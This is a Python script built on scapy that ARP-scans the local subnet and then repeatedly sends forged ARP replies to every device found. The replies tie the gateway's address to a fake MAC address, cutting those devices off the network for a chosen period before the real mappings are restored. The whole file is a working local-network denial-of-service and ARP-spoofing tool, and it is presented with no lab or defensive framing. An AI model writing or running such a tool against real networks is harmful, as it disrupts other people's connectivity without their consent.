import os
import sys
import time 
import platform
from collections import namedtuple

from scapy.all import ARP, send, arping, socket, logging

import constants
import messages
import logger as Logger

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((constants.EXTERNAL_URL_FOR_ACQUIRING_IP, 80))
    ip = s.getsockname()
    s.close()
    return ip[0]


def get_devices_identities(ips):
    answers, _ = arping(ips, verbose = 0)

    NetworkIdentity = namedtuple('NetworkIdentity', ['ip', 'mac'])
    return [NetworkIdentity(ip=answer[1].psrc, mac=answer[1].hwsrc) for answer in answers]


def destroy(victim_ip, victim_mac, gateway_ip):
    packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)
    
    
def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)
    
    
def check_permission():
    if platform.system() is not 'Windows':
        if os.geteuid() != 0:
            Logger.permission_denied
            exit()
    
        
def get_ip_range(my_ip):
    return ".".join(my_ip.split(".")[:-1]) + ".*"


def get_block_time():
    try:
        time_amount = int(input(messages.DESTROY_TIME_AMOUNT_MSG))
        return time.time() + time_amount
    except ValueError:
        time_amount = None
        return time_amount
    finally:
        Logger.blocking_for(time_amount)


if __name__ == "__main__":
    check_permission()
    ip_base = get_ip_range(get_my_ip())
    devices_identities = get_devices_identities(ip_base)
    gateway_ip, gateway_mac = devices_identities[0]    
    Logger.show_connected_ips(devices_identities)
    block_time = get_block_time()

    try:
        while (not block_time) or (time.time() < block_time):
            for victim in devices_identities:
                destroy(victim.ip, victim.mac, gateway_ip)
    except KeyboardInterrupt:
        sys.exit(0)
    finally:
        Logger.restoring_connections()
        for victim in devices_identities:
            restore(victim.ip, victim.mac, gateway_ip, gateway_mac) 
        Logger.connections_restored()
    
